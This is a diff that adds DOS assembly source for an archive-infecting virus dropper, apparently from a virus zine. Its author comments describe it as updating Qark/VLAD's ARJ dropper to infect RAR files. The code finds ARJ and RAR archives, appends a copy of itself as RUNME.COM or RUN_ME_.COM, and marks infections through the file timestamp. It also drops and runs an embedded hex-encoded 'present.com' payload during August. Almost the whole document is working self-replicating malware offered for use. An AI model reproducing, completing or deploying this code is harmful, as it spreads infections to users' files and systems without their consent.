@@ -1,0 +1,652 @@
+   ; Hi guys.
+   ;
+   ; I am a coder of viewer and i think what I must write something else for first
+   ; Slovak *-Zine. So i update Quark's ARJ Dropper for RAR dropping.
+   ; I think what archive infection have feature at every OS, so i want to include
+   ; ZIP and LHA dropping to nex relase of *-Zine. What this code does and what no.
+   ;
+   ; at first it check if is today some day fo August. If yes then it exec my present.
+   ;
+   ; Else it goes to infection.
+   ; at second it find first ARJ for infection. If it find some then it try to infect
+   ; it. if archive is infected now it is looking for next one ARJ. If is doesnot find
+   ; any ARJ for infection ti try infect RAR files. RAR file can't be MULTIVOLUME ( at
+   ; next relase it can be.) , can't be LOCKED and in archive can't be present AUTENTYCITY
+   ; informatins. RAR infection is verry simply. Go to eof write header, write yourself
+   ; ad infection is done.
+   ;
+   ;    So I wish you many happy days and connection reset only by beer and never
+   ;    by peer.
+   ;
+   ;                                 Blesk.
+   ;
+   ;
+   ; My greating to : all co-authors of this zine,   >>> see ya at next relase
+   ;                  #v,                            >>> I will be back soon
+   ;                  Qark,                          >>> Thank for ARJDrop in VLAD
+   ;                  Dalmatin101                    >>> I miss you.
+   ;                  Ilo                            >>> Thanx for keys from LAB.
+   ;                  Pedro                          >>> Parchante ozvi se !!!!
+   ;
+   ;
+   ; PS: Do you know how call worst muttation of AIDS [eic]. I think what Gates
+   ;     [geits] and W95
+   ; PS2: To view present.com you must have math-coprocesor.
+   ;
+   ; --8<-----Cut here --------------------------------------8<-----------------
+
+   ;       ARJDrop by Qark/VLAD
+   ;       RARDrop by Blesk
+   ;
+
+   CODE    SEGMENT PUBLIC USE16 'CODE'
+           ASSUME  CS:CODE,SS:code,DS:code
+
+   .386
+       org 100h
+   proces:
+
+           call    efect
+
+           mov     ah,4eh
+   nextarj:
+           mov     cx,3
+           mov     dx,offset wildarj  ; Find firest *.arj
+           int     21h
+           jnc     openarc
+
+           mov     ah,4eh
+   nextrar:
+           mov     cx,3
+           mov     dx,offset wildrar  ; Find first *.rar
+           int     21h
+           jnc     openrar
+           int     20h
+
+   openrar:
+
+           mov     ax,3d02h
+           mov     dx,9eh
+           int     21h
+
+           mov     bx,ax
+
+           mov     ax,5700h
+           int     21h
+
+           mov     word ptr time,cx
+           mov     word ptr date,dx
+
+           and     cx,1fh
+           or      cx,cx
+           jnz     notinfected_        ; Check time for detection if infected
+           mov     ah,3eh
+           int     21h
+           mov     ah,4fh
+           jmp     nextrar
+
+   notinfected_:
+           call    infectrar
+
+           mov     ax,5701h
+           mov     cx,word ptr time
+           and     cx,0ffe0h
+           mov     dx,word ptr date
+           int     21h
+
+           mov     ah,3eh
+           int     21h
+
+           int     20h
+   openarc:
+
+           mov     ax,3d02h
+           mov     dx,9eh
+           int     21h
+
+           mov     bx,ax
+
+           mov     ax,5700h
+           int     21h
+
+           mov     word ptr time,cx
+           mov     word ptr date,dx
+
+           and     cx,1fh
+           or      cx,cx
+           jnz     notinfected
+           mov     ah,3eh
+           int     21h
+           mov     ah,4fh
+           jmp     nextarj
+
+   notinfected:
+           call    infectarj
+
+           mov     ax,5701h
+           mov     cx,word ptr time
+           and     cx,0ffe0h
+           mov     dx,word ptr date
+           int     21h
+
+           mov     ah,3eh
+           int     21h
+
+           int     20h
+
+   wildarj db      "*.ARJ",0
+   wildrar db      "*.RAR",0
+
+   db      0dh,0ah,"RAR'n'ARJ Dropper by Qark/VLAD.",0dh,0ah
+   db      "RAR support included by Blesk",0dh,0ah
+
+   infectarj       proc    near
+   ;on entry bx=file handle
+           push    ds
+           push    es
+
+           push    cs
+           pop     ds
+           push    cs
+           pop     es
+
+
+           mov     ax,4202h
+           xor     cx,cx
+           cwd
+           int     21h
+
+           sub     ax,4
+           sbb     dx,0
+           mov     cx,dx
+           mov     dx,ax
+           mov     ax,4200h
+           int     21h
+
+           mov     word ptr csize,offset _end - 100h
+           mov     word ptr osize,offset _end - 100h
+
+           mov     cx,offset _end - 100h
+           mov     si,100h                         ; Begin of program
+           call    crc32
+
+           cld
+           mov     si,offset marker
+           mov     di,offset sparebuff
+           mov     cx,offset rend - offset marker
+           rep     movsb                          ; Copy header of ARJ
+
+           mov     word ptr crc,ax
+           mov     word ptr crc+2,dx
+
+           mov     cx,word ptr bhsize
+           mov     si,offset fhsize
+           call    crc32                          ; Count CRC of file
+           mov     word ptr acrc,ax
+           mov     word ptr acrc+2,dx
+
+           mov     ah,40h
+           mov     cx,offset fdata - offset marker
+           mov     dx,offset marker
+           int     21h                            ; Write header
+
+           mov     ah,40h
+           mov     cx,offset marker - 100h
+           mov     dx,100h
+           int     21h                            ; Write yourself
+           mov     ah,40h
+           mov     cx,offset rend - offset marker ;
+           mov     dx,offset sparebuff
+           int     21h
+
+           mov     ah,40h
+           mov     cx,4
+           mov     dx,offset fdend
+           int     21h
+
+           pop     es
+           pop     ds
+
+           ret
+
+   infectarj       endp
+   ;###########################################################
+   s5:             ret
+   infectrar       proc    near
+   ;on entry bx=file handle
+
+                   mov     [word ptr ds:rar_handle],bx
+                   mov     ah,3fh
+                   mov     cx,10h       ; Main Rar! header
+                   mov     dx, offset r_head_m
+                   int     21h          ; Read RAR header
+                   jc      s5
+
+                   mov     ax,[word ptr ds:(r_head_m)]
+                   cmp     ax,'aR'
+                   jnz     s5
+
+                   mov     dx,[word ptr ds:(r_first)]
+                   mov     cx,[word ptr ds:(r_first)+2]
+                   sub     dx,6 ;7
+                   sbb     cx,0         ; Get offset of infoblock
+
+                   mov     ax,4200h
+                   int     21h          ; Go to info block
+                   jc      s5
+
+                   mov     ah,3fh
+                   mov     cx,8
+                   mov     dx, offset r_f_head
+                   int     21h
+
+                   mov     ax,[word ptr ds:(r_h_flag)]
+                   push    ax
+                   and     ax,20h      ; Authenticity information ?
+                   jnz     _present_brekeke
+                   pop     ax
+                   push    ax
+                   and     ax,1h       ; Volume attribute (archive volume) ??
+                   jnz     _present_brekeke
+                   pop     ax
+                   push    ax
+                   and     ax,4h       ; Archive lock attribute ???
+                   jnz     _present_brekeke
+                   pop     ax
+                   push    ax
+                   and     ax,4h       ; Archive lock attribute ???
+                   jnz     _present_brekeke
+                   pop     ax
+
+                   ; Here we can now infect RAR file
+                   mov     ax,4202h
+                   cwd
+                   mov     cx,dx
+                   int     21h          ; seek to eof archive for append(ix)
+
+
+                   cld
+
+                   mov     si,offset rar_hdr
+                   mov     di,offset rrar_hdr
+                   mov     cx,offset rar_end_hdr - offset rar_hdr
+                   push    cs
+                   pop     es
+                   rep     movsb                              ; Make copy of header
+
+                   mov     cx,offset _end - 100h
+                   mov     si,100h                            ; begin of program in memory
+                   call    crc32
+
+                   mov     word ptr rr_file_crc32,ax
+                   mov     word ptr rr_file_crc32+2,dx        ; Write FileCRC to header
+
+                   xor     eax,eax
+                   mov     ax,offset _end - 100h
+                   mov     Dword ptr rr_pack_size,eax
+                   mov     Dword ptr rr_unp_size,eax
+
+                   mov     cx,offset rar_end_hdr -r_typ
+                   mov     si,offset rr_typ                   ; Begin of rar header
+                   call    crc32                              ; Make CRC of header
+
+                   mov     word ptr rr_crc,ax                 ; Update header copy
+
+                   mov     bx,[word ptr ds:rar_handle]
+                   mov     ah,40h
+                   mov     cx,offset rar_end_hdr - offset rar_hdr
+                   mov     dx,offset rrar_hdr
+                   int     21h
+
+                   mov     ah,40h
+                   mov     cx,offset _end - 100h
+                   mov     dx,100h
+                   int     21h                                ; Write yourself body to
+                                                              ; archive
+           RET
+   ;=================
+   infectrar       endp
+
+   _present_brekeke:                   ; Dont infect and quit
+                   pop     ax
+                   ret
+   ;###########################################################
+
+   crc32   proc    near
+   ;on entry cx=number of bytes to checksum
+   ;         si=pointer to bytes
+   ;on exit dx:ax contains the checksum
+   ;I stole this code from some PD sources I got off a BBS.
+
+           push    bx
+           push    cx
+           push    si
+           push    di
+
+           call    gentable
+
+           mov     dx,-1
+           mov     ax,-1
+
+   crc32loop:
+           xor     bx,bx
+           mov     bl,byte ptr [si]
+           inc     si
+           xor     bl,al
+           shl     bx,1
+           shl     bx,1
+           mov     al,ah
+           mov     ah,dl
+           mov     dl,dh
+           xor     dh,dh
+           xor     ax,word ptr [bx+crc32tab]
+           xor     dx,word ptr [bx+crc32tab+2]
+
+           dec     cx
+           jnz     crc32loop
+           pop     di
+           pop     si
+           pop     cx
+           pop     bx
+
+           xor     dx,-1
+           xor     ax,-1
+
+           ret
+
+   crc32   endp
+
+
+   Gentable        proc    near
+   ;Generates the 32bit crc table.  Thanks to "Necrosoft Enterprises" who had
+   ;this code inside their Dementia Virus.  I have plenty of other code to do
+   ;this, but it is all much, much bigger.
+           push    ax
+           push    cx
+           push    dx
+           push    di
+
+           mov     di,offset crc32tab
+           xor     cx,cx
+
+   outgen:
+           xor     dx,dx
+           xor     ax,ax
+           mov     al,cl
+           push    cx
+           mov     cx,8
+   calcloop:
+           clc
+           rcr     dx,1
+           rcr     ax,1
+           jnc     nocrcxor
+           xor     dx,0edb8h
+           xor     ax,8320h
+   nocrcxor:
+           loop    calcloop
+           mov     word ptr [di],ax
+           mov     word ptr [di+2],dx
+           add     di,4
+           pop     cx
+           inc     cx
+           cmp     cx,100h
+           jne     outgen
+           pop     di
+           pop     dx
+           pop     cx
+           pop     ax
+   pp:
+           ret
+   Gentable        endp
+   present_name:   db 'present.com',0
+   efect:
+
+           mov     ah,4
+           int     1ah
+           cmp     dh,8                    ; It is now august ???
+           jnz     pp                      ; No go to replicate
+
+           mov     ah,3ch
+           mov     dx,offset present_name
+           mov     cx,20h
+           int     21h
+           xchg    ax,bx
+           jc      pp
+
+           mov     ah,40h
+           mov     dx,offset _begin_present
+           mov     cx,offset (_end_present)-(offset _begin_present)
+           int     21h
+           jc      pp
+
+           mov     ah,3eh
+           int     21h
+
+           mov     ah,4ah
+           mov     bx,4000h
+           int     21h             ; free memory for execution
+
+           mov     ax,4b00h
+           mov     dx,offset present_name
+           int     21h
+
+           int     20h
+
+   ;   PRESENT.com !!!!!!!!
+   _begin_present:
+   db 0B8h,012h,000h,0CDh,010h,0E8h,034h,006h,0B8h,013h,000h,0CDh,010h,0E8h,011h,006h
+   db 033h,0C0h,0E8h,002h,007h,073h,003h,0E9h,054h,002h,0A3h,0C5h,008h,0A3h,0C7h,008h
+   db 0C6h,006h,0EDh,008h,07Fh,0C6h,006h,0F1h,008h,002h,0BFh,0C5h,008h,0BDh,077h,004h
+   db 0E8h,05Ch,007h,072h,003h,0E9h,036h,002h,0BFh,0C5h,008h,0BDh,07Bh,004h,0E8h,0FDh
+   db 006h,0FEh,00Eh,0F1h,008h,075h,010h,0C6h,006h,0F1h,008h,002h,0FEh,00Eh,0EDh,008h
+   db 075h,005h,0C6h,006h,0EDh,008h,07Fh,0C7h,006h,0D9h,008h,096h,000h,0C7h,006h,0DBh
+   db 008h,050h,000h,0A1h,0D9h,008h,0A3h,0E5h,008h,0A3h,0E7h,008h,0BFh,0D1h,008h,0BDh
+   db 0C5h,008h,0E8h,0C3h,006h,0BDh,08Ah,004h,0E8h,0D5h,006h,0A1h,0DBh,008h,0BFh,0D5h
+   db 008h,0E8h,0E2h,006h,0BDh,0D1h,008h,0E8h,0BCh,006h,0E8h,0E2h,006h,0A3h,0E9h,008h
+   db 0BFh,0D1h,008h,0BDh,0C5h,008h,0E8h,09Fh,006h,0BDh,0ACh,004h,0E8h,0B1h,006h,0A1h
+   db 0DBh,008h,0BFh,0D5h,008h,0E8h,0BEh,006h,0BFh,0D5h,008h,0BDh,0D1h,008h,0E8h,08Dh
+   db 006h,0E8h,0BBh,006h,0A3h,0EBh,008h,033h,0C0h,0A3h,0C1h,008h,033h,0C0h,0A3h,0C3h
+   db 008h,0EBh,00Fh,090h,0BEh,0C1h,008h,0BDh,0C0h,004h,0E8h,0C2h,006h,072h,003h,0E9h
+   db 099h,001h,0BFh,0D1h,008h,0BDh,0C1h,008h,0E8h,05Dh,006h,0E8h,072h,006h,0E8h,05Dh
+   db 006h,0BDh,08Ah,004h,0E8h,057h,006h,0BFh,0D5h,008h,0BDh,0C1h,008h,0E8h,048h,006h
+   db 0E8h,05Dh,006h,0E8h,048h,006h,0BDh,0ACh,004h,0E8h,04Ah,006h,0BFh,0D5h,008h,0BDh
+   db 0D1h,008h,0E8h,052h,006h,0BDh,0B0h,004h,0E8h,045h,006h,0BFh,0C9h,008h,0BDh,0D5h
+   db 008h,0E8h,024h,006h,0BFh,0D5h,008h,0BDh,0C1h,008h,0E8h,01Bh,006h,0E8h,030h,006h
+   db 0BFh,0D1h,008h,0BDh,0C8h,004h,0E8h,00Fh,006h,0BDh,0D5h,008h,0E8h,017h,006h,0E8h
+   db 02Eh,006h,0BDh,0B0h,004h,0E8h,018h,006h,0BFh,0CDh,008h,0BDh,0D1h,008h,0E8h,0F7h
+   db 005h,0BFh,0D5h,008h,0BDh,0C9h,008h,0E8h,0EEh,005h,0BDh,0CDh,008h,0E8h,0EEh,005h
+   db 0BDh,0C5h,008h,0E8h,0FAh,005h,0A1h,0DBh,008h,0BFh,0D1h,008h,0E8h,007h,006h,0BDh
+   db 0D5h,008h,0E8h,0E1h,005h,0E8h,007h,006h,0A3h,0E1h,008h,0BFh,0D5h,008h,0BDh,0C5h
+   db 008h,0E8h,0C4h,005h,0BDh,0C1h,008h,0E8h,0D6h,005h,0A1h,0D9h,008h,0BFh,0D1h,008h
+   db 0E8h,0E3h,005h,0BDh,0D5h,008h,0E8h,0B5h,005h,0E8h,0E3h,005h,0A3h,0DDh,008h,0BFh
+   db 0D5h,008h,0BDh,0C9h,008h,0E8h,0A0h,005h,0BDh,0CDh,008h,0E8h,0A8h,005h,0BDh,0C5h
+   db 008h,0E8h,0ACh,005h,0A1h,0DBh,008h,0BFh,0D1h,008h,0E8h,0B9h,005h,0BDh,0D5h,008h
+   db 0E8h,093h,005h,0E8h,0B9h,005h,0A3h,0E3h,008h,0BFh,0D5h,008h,0BDh,0C5h,008h,0E8h
+   db 076h,005h,0BDh,0C1h,008h,0E8h,088h,005h,0A1h,0D9h,008h,0BFh,0D1h,008h,0E8h,095h
+   db 005h,0BDh,0D5h,008h,0E8h,06Fh,005h,0E8h,095h,005h,0A3h,0DFh,008h,0FFh,036h,0E5h
+   db 008h,0FFh,036h,0E9h,008h,0FFh,036h,0DDh,008h,0FFh,036h,0E1h,008h,033h,0C0h,0A0h
+   db 0EDh,008h,050h,0E8h,0A1h,002h,0FFh,036h,0E7h,008h,0FFh,036h,0EBh,008h,0FFh,036h
+   db 0DFh,008h,0FFh,036h,0E3h,008h,033h,0C0h,0A0h,0EDh,008h,050h,0E8h,088h,002h,0FFh
+   db 036h,0E7h,008h,0FFh,036h,0E9h,008h,0FFh,036h,0DFh,008h,0FFh,036h,0E1h,008h,033h
+   db 0C0h,0A0h,0EDh,008h,050h,0E8h,06Fh,002h,0FFh,036h,0E5h,008h,0FFh,036h,0EBh,008h
+   db 0FFh,036h,0DDh,008h,0FFh,036h,0E3h,008h,033h,0C0h,0A0h,0EDh,008h,050h,0E8h,056h
+   db 002h,0A1h,0DDh,008h,08Bh,01Eh,0DFh,008h,08Bh,00Eh,0E1h,008h,08Bh,016h,0E3h,008h
+   db 0A3h,0E5h,008h,089h,01Eh,0E7h,008h,089h,00Eh,0E9h,008h,089h,016h,0EBh,008h,0BFh
+   db 0C1h,008h,0BDh,0CCh,004h,0E8h,0D6h,004h,0E9h,059h,0FEh,0E9h,0BCh,0FDh,056h,0BEh
+   db 05Dh,004h,0B9h,024h,000h,0BAh,041h,000h,0E8h,0B0h,002h,0BEh,07Fh,004h,0B9h,03Ch
+   db 000h,0B0h,002h,0A2h,03Bh,007h,0BAh,05Ah,000h,0E8h,09Fh,002h,0BEh,0C4h,004h,0B9h
+   db 078h,000h,0BAh,078h,000h,0E8h,093h,002h,0B0h,000h,0A2h,03Bh,007h,0BEh,08Eh,004h
+   db 0B9h,014h,000h,0BAh,00Ah,000h,0E8h,082h,002h,0BEh,0B4h,004h,0B9h,034h,000h,0BAh
+   db 019h,000h,0FEh,006h,03Bh,007h,0E8h,072h,002h,0FEh,00Eh,03Bh,007h,05Eh,0E8h,01Eh
+   db 003h,0A2h,0EEh,008h,0B9h,043h,004h,032h,0C0h,0BAh,0C8h,003h,0EEh,0BAh,0C9h,003h
+   db 0EEh,0EEh,0EEh,0A2h,0EDh,008h,051h,0B9h,07Fh,000h,0FEh,006h,0EDh,008h,0A0h,0EEh
+   db 008h,002h,006h,0EDh,008h,0BAh,0C9h,003h,0EEh,033h,0C0h,0EEh,0EEh,0E2h,0EBh,0B9h
+   db 07Fh,000h,033h,0C0h,0EEh,0EEh,0FEh,006h,0EDh,008h,0A0h,0EEh,008h,002h,006h,0EDh
+   db 008h,0BAh,0C9h,003h,0EEh,033h,0C0h,0E2h,0EBh,0EEh,0EEh,0B0h,0FFh,0EEh,0FEh,006h
+   db 0EEh,008h,033h,0C9h,0BAh,0FFh,02Fh,0E8h,03Eh,000h,059h,0E2h,0AAh,0B0h,000h,0BAh
+   db 0C8h,003h,0EEh,0B0h,000h,042h,0B9h,0FDh,002h,0EEh,051h,052h,033h,0C9h,0BAh,0FFh
+   db 02Fh,0E8h,024h,000h,05Ah,059h,033h,0C0h,0E2h,0EFh,0B9h,003h,000h,0BAh,0FFh,0FFh
+   db 0E8h,015h,000h,0E8h,097h,003h,033h,0C9h,0BAh,0FFh,05Fh,0E8h,00Ah,000h,0E8h,064h
+   db 003h,0B8h,003h,000h,0CDh,010h,0CDh,020h,0B4h,086h,0CDh,015h,0C3h,050h,072h,065h
+   db 073h,065h,06Eh,074h,020h,062h,079h,020h,042h,06Ch,065h,073h,06Bh,020h,020h,077h
+   db 069h,073h,068h,020h,059h,06Fh,075h,000h,000h,0A0h,041h,00Ah,0D7h,0A3h,03Dh,048h
+   db 041h,050h,050h,059h,020h,042h,02Dh,044h,041h,059h,000h,000h,000h,040h,05Bh,061h
+   db 06Eh,020h,041h,04Eh,047h,045h,04Ch,02Dh,053h,069h,067h,06Eh,020h,06Fh,066h,020h
+   db 069h,06Dh,06Dh,06Fh,072h,074h,061h,06Ch,069h,074h,079h,05Dh,000h,000h,0C0h,040h
+   db 0ABh,0AAh,02Ah,03Fh,062h,079h,020h,042h,06Ch,065h,073h,06Bh,020h,038h,05eh,029h
+   db 000h,000h,0C0h,040h,053h,075h,07Ah,079h,000h,000h,010h,042h,08Fh,0C2h,0F5h,03Ch
+   db 043h,069h,074h,061h,074h,020h,06Bh,06Ch,061h,073h,069h,06Bh,061h,03Ah,000h,04Bh
+   db 020h,061h,06Eh,069h,065h,06Ch,06Fh,076h,069h,020h,063h,068h,072h,062h,074h,06Fh
+   db 06Dh,02Eh,000h,054h,061h,06Bh,020h,07Ah,061h,063h,061h,06Ch,020h,073h,06Fh,06Dh
+   db 020h,063h,065h,073h,074h,06Fh,075h,020h,068h,069h,072h,065h,063h,068h,075h,020h
+   db 069h,073h,074h,02Eh,000h,04Bh,020h,061h,06Eh,069h,065h,06Ch,06Fh,076h,069h,020h
+   db 063h,068h,072h,062h,074h,06Fh,06Dh,02Ch,000h,06Ch,065h,06Eh,020h,031h,032h,020h
+   db 06Bh,072h,06Fh,06Bh,06Fh,076h,02Ch,000h,061h,020h,031h,032h,020h,06Fh,07Ah,076h
+   db 069h,065h,06Eh,020h,06Eh,061h,020h,06Eh,065h,02Ch,000h,061h,020h,064h,06Fh,073h
+   db 069h,065h,06Ch,020h,073h,06Fh,06Dh,020h,074h,061h,06Dh,02Ch,06Bh,061h,06Dh,020h
+   db 073h,06Fh,06Dh,020h,06Eh,065h,06Dh,061h,06Ch,020h,070h,072h,069h,073h,074h,000h
+   db 00Dh,00Ah,044h,065h,064h,069h,063h,061h,074h,065h,064h,020h,074h,06Fh,020h,06Dh
+   db 079h,020h,066h,072h,069h,065h,06Eh,064h,073h,020h,053h,075h,07Ah,079h,026h,050h
+   db 045h,044h,052h,04Fh,000h,00Dh,00Ah,055h,08Bh,0ECh,0B8h,000h,0A0h,08Eh,0C0h,0B8h
+   db 040h,001h,08Bh,07Eh,004h,08Bh,04Eh,00Ah,08Bh,05Eh,00Ch,08Bh,056h,006h,08Bh,06Eh
+   db 008h,03Bh,0CAh,07Eh,004h,087h,0CAh,087h,0DDh,08Bh,0F2h,0F7h,0E1h,08Bh,0D6h,003h
+   db 0C3h,097h,02Bh,0EBh,02Bh,0D1h,0BEh,001h,000h,083h,0FDh,000h,07Fh,005h,083h,0EEh
+   db 002h,0F7h,0DDh,03Bh,0EAh,07Eh,02Ah,08Bh,0CDh,003h,0D2h,08Bh,0DAh,02Bh,0DDh,003h
+   db 0EDh,026h,088h,005h,083h,0F9h,000h,074h,014h,083h,0FBh,000h,07Ch,006h,081h,0C7h
+   db 040h,001h,02Bh,0DDh,003h,0DAh,003h,0FEh,026h,088h,005h,0E2h,0ECh,05Dh,0C2h,00Ah
+   db 000h,08Bh,0CAh,003h,0EDh,08Bh,0DDh,02Bh,0DAh,003h,0D2h,026h,088h,005h,083h,0F9h
+   db 000h,074h,014h,083h,0FBh,000h,07Ch,004h,003h,0FEh,02Bh,0DAh,003h,0DDh,081h,0C7h
+   db 040h,001h,026h,088h,005h,0E2h,0ECh,05Dh,0C2h,00Ah,000h,0B7h,000h,0ACh,03Ch,000h
+   db 074h,016h,0E8h,019h,000h,083h,0C1h,009h,08Ah,026h,03Bh,007h,080h,0FCh,001h,074h
+   db 008h,080h,0FCh,002h,074h,003h,0EBh,0E5h,0C3h,083h,0C1h,008h,0EBh,0DFh,050h,051h
+   db 052h,0B8h,030h,011h,0CDh,010h,05Ah,059h,0B0h,080h,0B3h,008h,0F6h,0E3h,02Bh,0E8h
+   db 058h,0B3h,008h,0F6h,0E3h,003h,0E8h,051h,052h,026h,08Ah,046h,000h,0E8h,01Ah,000h
+   db 08Ah,026h,03Bh,007h,080h,0FCh,002h,075h,008h,042h,026h,08Ah,046h,000h,0E8h,009h
+   db 000h,042h,045h,0FEh,0CBh,075h,0E2h,05Ah,059h,0C3h,053h,051h,0B3h,008h,0D0h,0D0h
+   db 073h,01Bh,0E8h,033h,000h,08Ah,026h,03Bh,007h,080h,0FCh,001h,074h,008h,080h,0FCh
+   db 002h,074h,003h,0EBh,01Ah,090h,041h,0E8h,01Eh,000h,0EBh,013h,090h,08Ah,026h,03Bh
+   db 007h,080h,0FCh,001h,074h,008h,080h,0FCh,002h,074h,003h,0EBh,002h,090h,041h,041h
+   db 0F8h,0FEh,0CBh,075h,0C9h,059h,05Bh,0C3h,050h,056h,057h,055h,0B4h,00Dh,0CDh,010h
+   db 0B4h,0FFh,02Ah,0E0h,08Ah,0C4h,0B4h,00Ch,0CDh,010h,05Dh,05Fh,05Eh,058h,0C3h,033h
+   db 0C0h,0BAh,0C8h,003h,0EEh,042h,0EEh,0EEh,0EEh,0A2h,0EDh,008h,0C6h,006h,0F1h,008h
+   db 002h,0EBh,005h,090h,0FEh,006h,0EDh,008h,0EEh,050h,032h,0C0h,0EEh,0EEh,058h,0FEh
+   db 0C0h,080h,03Eh,0EDh,008h,07Fh,075h,0ECh,033h,0C0h,0FEh,0C0h,0FEh,006h,0EDh,008h
+   db 050h,032h,0C0h,0EEh,0EEh,058h,0EEh,0FEh,0C0h,080h,03Eh,0EDh,008h,0FEh,075h,0ECh
+   db 0C3h,033h,0C0h,0BAh,0C8h,003h,0EEh,0BAh,0C9h,003h,0EEh,0EEh,0EEh,0B9h,0FAh,002h
+   db 0B0h,0FFh,0EBh,001h,090h,0EEh,0E2h,0FDh,033h,0C0h,0C3h,000h,0BEh,0D0h,004h,0B9h
+   db 040h,000h,0BAh,00Ah,000h,0B0h,002h,0A2h,03Bh,007h,0E8h,0DEh,0FEh,0B0h,000h,0A2h
+   db 03Bh,007h,0BEh,0DFh,004h,0B9h,01Eh,000h,0BAh,050h,000h,051h,0E8h,0CCh,0FEh,0BEh
+   db 0F3h,004h,059h,051h,0BAh,06Eh,000h,0E8h,0C1h,0FEh,0BEh,015h,005h,059h,051h,0BAh
+   db 08Ch,000h,0E8h,0B6h,0FEh,0BEh,029h,005h,059h,051h,0BAh,0AAh,000h,0E8h,0ABh,0FEh
+   db 0BEh,038h,005h,059h,051h,0BAh,0C8h,000h,0E8h,0A0h,0FEh,0BEh,04Bh,005h,059h,051h
+   db 0BAh,0E6h,000h,0E8h,095h,0FEh,0BEh,072h,005h,059h,0BAh,054h,001h,0FEh,006h,03Bh
+   db 007h,0E8h,087h,0FEh,0FEh,00Eh,03Bh,007h,0B9h,015h,000h,033h,0D2h,0E8h,0A8h,0FCh
+   db 0B4h,007h,0CDh,021h,0C3h,0B9h,03Fh,000h,0B0h,000h,0BAh,0C8h,003h,0EEh,042h,051h
+   db 08Bh,0D9h,0B9h,080h,001h,0EEh,0E2h,0FDh,0B9h,080h,001h,08Ah,0C3h,0EEh,0E2h,0FDh
+   db 0B9h,001h,000h,0BAh,0FFh,02Fh,0E8h,07Fh,0FCh,059h,0E2h,0DCh,0C3h,0B9h,03Fh,000h
+   db 0B0h,000h,0BAh,0C8h,003h,0EEh,042h,051h,0BBh,0FFh,000h,02Bh,0D9h,0B9h,080h,001h
+   db 0EEh,0E2h,0FDh,0B9h,080h,001h,08Ah,0C3h,0EEh,0E2h,0FDh,033h,0C9h,0BAh,0FFh,03Fh
+   db 0E8h,055h,0FCh,059h,0E2h,0DAh,0C3h,09Bh,0DDh,03Eh,0BAh,008h,0A1h,0BAh,008h,03Ch
+   db 000h,074h,002h,0F9h,0C3h,0F8h,0C3h,09Bh,0DBh,0E3h,09Bh,0DBh,0E2h,09Bh,0D9h,03Eh
+   db 0BAh,008h,0A1h,0BAh,008h,0B4h,00Fh,025h,0C0h,0FFh,00Dh,004h,000h,0A3h,0BAh,008h
+   db 0D9h,02Eh,0BAh,008h,0E8h,0D0h,0FFh,0C3h,0D9h,046h,000h,0EBh,010h,090h,0E8h,058h
+   db 000h,0DEh,0C1h,0EBh,008h,090h,0D9h,005h,0D9h,046h,000h,0DEh,0E9h,0D9h,01Dh,0C3h
+   db 0E8h,046h,000h,0DEh,0C9h,0EBh,0F6h,0D9h,005h,0D9h,046h,000h,0DEh,0F9h,0EBh,0EDh
+   db 0D9h,005h,0D9h,0FAh,0EBh,0F8h,0A3h,0BEh,008h,0DFh,006h,0BEh,008h,0EBh,0EFh,0D9h
+   db 005h,0DFh,01Eh,0BEh,008h,0A1h,0BEh,008h,0C3h,0E8h,023h,000h,025h,008h,000h,074h
+   db 001h,0F9h,0C3h,0E8h,019h,000h,025h,00Dh,000h,075h,002h,0F9h,0C3h,0F8h,0C3h,0E8h
+   db 00Dh,000h,025h,001h,000h,074h,001h,0F9h,0C3h,0D9h,046h,000h,0D9h,005h,0C3h,0D9h
+   db 005h,0D8h,05Eh,000h,09Bh,0DDh,03Eh,0BEh,008h,0A1h,0BEh,008h,08Ah,0C4h,025h,007h
+   db 040h,0C0h,0ECh,003h,00Ah,0C4h,0B4h,000h,0F8h,0C3h,000h,000h,000h,000h,000h,000h
+   _end_present:
+
+   rar_hdr:
+   r_crc:          dw      0
+   r_typ:          db      74h             ; File header
+   r_flag:         dw      8000h           ;
+   r_h_size:       dw      2bh             ; Header size
+   r_pack_size:    dd      0
+   r_unp_size:     dd      0
+   r_host_os:      db      0               ; OS to extract : 0=MS-DOS
+   r_file_crc32:   dd      0
+   r_time:         dd      01170800h       ; File date & time (23.8.1980 1:00am)
+   r_unp_ver:      db      14h
+   r_method:       db      30h             ; Method = STORE
+   r_fn_size:      dw      0bh             ; FileName size
+   r_f_attr:       dd      20h
+   r_f_name:       db      'RUN_ME_.COM'   ; File name
+   rar_end_hdr:
+   rar_end:
+
+   rbuff:
+
+   marker  db      60h,0eah
+   bhsize  dw      offset acrc - offset fhsize
+   fhsize  db      offset aname - offset fhsize
+   anum    db      6
+   anum2   db      1
+   osver   db      0
+   aflag   db      0
+   ameth   db      0               ;stored
+   aftype  db      0               ;binary
+   ares    db      0
+   dtm     dd      01170800h       ;File date & time (23.8.1980 1:00am)
+   csize   dd      4               ;compressed size
+   osize   dd      4               ;original size
+   crc     dd      0
+   fspec   dw      0
+   faccess dw      20h
+   hstdata dw      0
+   aname   db      "RUNME.COM",0
+   acomm   db      0
+   acrc    dd      0
+   ehsize  dw      0
+
+   fdata   db      "!"
+   fdend:
+   db      60h,0eah,0,0
+
+   rend:
+   _end:
+   ;    ################## END OF PROGRAM ####################
+   ;   =============== Uninitialised fields !!! ===============
+
+   rar_handle:     dw      ?
+   time:           dw      ?
+   date:           dw      ?
+   tmp_handle:     dw      ?
+   where_from:     dd      ?
+
+   crc32tab        db      100h*4 dup (?)
+   sparebuff:
+
+   r_head_m:       db      7 dup(?)    ; Rar!,7,0
+                   dw      ?
+                   dw      ?
+                   db      ?
+   r_first:        dd      ?           ; First match
+
+   r_f_head:       dw      ?           ; checksum crc of header ( lo_word(crc32))
+   r_f_mark:       db      ?           ; Marker if it is file heder or main heder
+   r_h_flag:       dw      ?           ; flags
+   r_hdr_size:     dw      ?           ; Length of header include comments if present.
+   r_pack_s:       dd      ?           ; Length of compressed file
+   rrar_hdr:
+   rr_crc:          dw      ?
+   rr_typ:          db      ?          ; File header CRC
+   rr_flag:         dw      ?          ;
+   rr_h_size:       dw      ?          ;
+   rr_pack_size:    dd      ?
+   rr_unp_size:     dd      ?
+   rr_host_os:      db      ?          ;
+   rr_file_crc32:   dd      ?
+   rr_time:         dd      ?          ;
+   rr_unp_ver:      db      ?
+   rr_method:       db      ?          ; STORE
+   rr_fn_size:      dw      ?          ;
+   rr_f_attr:       dd      ?
+   rr_f_name:       db      ?          ;
+   rrar_end_hdr:
+
+   CODE    ENDS
+           END     PROCES
